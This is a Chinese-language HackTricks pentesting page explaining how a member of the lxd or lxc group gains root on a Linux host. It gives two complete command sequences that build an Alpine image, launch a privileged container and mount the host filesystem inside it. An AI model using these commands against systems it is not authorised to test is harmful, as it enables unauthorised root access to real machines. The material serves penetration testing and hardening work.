# lxd/lxc 组 - 权限提升

{{#include ../../../banners/hacktricks-training.md}}

如果您属于 _**lxd**_ **或** _**lxc**_ **组**，您可以成为 root

## 无需互联网的利用

### 方法 1

您可以在您的机器上安装这个发行版构建工具：[https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(按照 GitHub 的说明进行操作)：
```bash
sudo su
# Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools

# Clone repo
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container
## Using build-lxd
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
## Using build-lxc
sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
```
上传文件 **lxd.tar.xz** 和 **rootfs.squashfs**，将镜像添加到仓库并创建一个容器：
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> 如果您发现此错误 _**错误：未找到存储池。请创建一个新的存储池**_\
> 运行 **`lxd init`** 并 **重复** 之前的命令块

最后，您可以执行容器并获取 root：
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### 方法 2

构建一个 Alpine 镜像并使用标志 `security.privileged=true` 启动它，强制容器以 root 身份与主机文件系统交互。
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
